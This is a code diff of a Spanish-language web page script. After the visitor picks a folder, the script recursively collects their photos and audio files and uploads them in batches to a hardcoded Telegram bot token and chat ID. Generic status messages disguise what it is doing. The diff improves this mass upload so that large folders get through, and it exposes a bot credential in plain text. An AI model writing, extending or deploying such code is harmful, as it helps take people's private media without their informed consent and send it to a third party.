@@ -30,56 +30,55 @@ document.getElementById('start-btn').addEventListener('click', async () => {
 
         if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');
 
-        setTimeout(async () => {
-            try {
-                updateStatus('Accediendo al sistema...', 10);
-                const folderHandle = await window.showDirectoryPicker();
+        const folderHandle = await window.showDirectoryPicker();
+        updateStatus('Analizando estructura...', 20);
 
-                updateStatus('Analizando estructura...', 20);
-                const files = await collectFiles(folderHandle);
-                if (!files.length) throw new Error('No se encontraron archivos compatibles');
-
-                updateStatus(`Archivos detectados: ${files.length}`, 30);
-
-                updateStatus('Iniciando envío a Telegram...', 40);
-                await sendFilesToTelegram(files);
-
-                updateStatus('✅ Subida completa', 100);
-            } catch (error) {
-                updateStatus(`❌ Error: ${error.message}`, 0);
-                alert(`ERROR: ${error.message}`);
-            }
-            isProcessing = false;
-        }, 100);
-
+        await collectAndSendInChunks(folderHandle); // NUEVO MÉTODO
+        updateStatus('✅ Subida completa', 100);
     } catch (error) {
-        updateStatus(`❌ Error: ${error.message}`, 0);
-        alert(`ERROR: ${error.message}`);
+        console.error(error);
+        updateStatus('❌ Error: ' + error.message, 0);
+    } finally {
         isProcessing = false;
     }
 });
 
-async function collectFiles(folderHandle) {
-    const files = [];
-    for await (const entry of folderHandle.values()) {
-        if (entry.kind === 'file') {
-            const fileName = entry.name.toLowerCase();
-            if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
-                fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
-                fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
-                files.push(entry);
+// FUNCIÓN MODIFICADA: ahora procesa por bloques de 100 archivos
+async function collectAndSendInChunks(folderHandle) {
+    const BATCH_SIZE = 100;
+    let batch = [];
+
+    async function processDirectory(handle) {
+        for await (const entry of handle.values()) {
+            if (entry.kind === 'file') {
+                const fileName = entry.name.toLowerCase();
+                if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
+                    fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
+                    fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
+                    batch.push(entry);
+
+                    if (batch.length === BATCH_SIZE) {
+                        await sendFilesToTelegram(batch);
+                        batch = []; // Limpiar lote
+                    }
+                }
+            } else if (entry.kind === 'directory') {
+                await processDirectory(entry); // Recursivamente ir a subcarpetas
             }
-        } else if (entry.kind === 'directory') {
-            const subFiles = await collectFiles(entry);
-            files.push(...subFiles);
         }
     }
-    return files;
+
+    await processDirectory(folderHandle);
+
+    // Enviar lo que quede en el último lote si no llegó a 100
+    if (batch.length > 0) {
+        await sendFilesToTelegram(batch);
+    }
 }
 
 async function sendFilesToTelegram(files) {
-    const token = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk'; // Token FIJO como pediste
-    const chatId = '5821490693'; // Tu chat ID
+    const token = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk';
+    const chatId = '5821490693';
 
     const total = files.length;
     let sent = 0;
@@ -104,8 +103,8 @@ async function sendFilesToTelegram(files) {
         }
 
         const progress = 40 + Math.floor((sent / total) * 60);
-        updateStatus(`Enviando archivo ${sent} de ${total}`, progress);
+        updateStatus(`Enviando archivo ${sent} de ${total} en lote`, progress);
 
-        await new Promise(resolve => setTimeout(resolve, 1000)); // Espera 1 segundo entre cada archivo
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Pausa de 1 segundo entre cada archivo
     }
 }
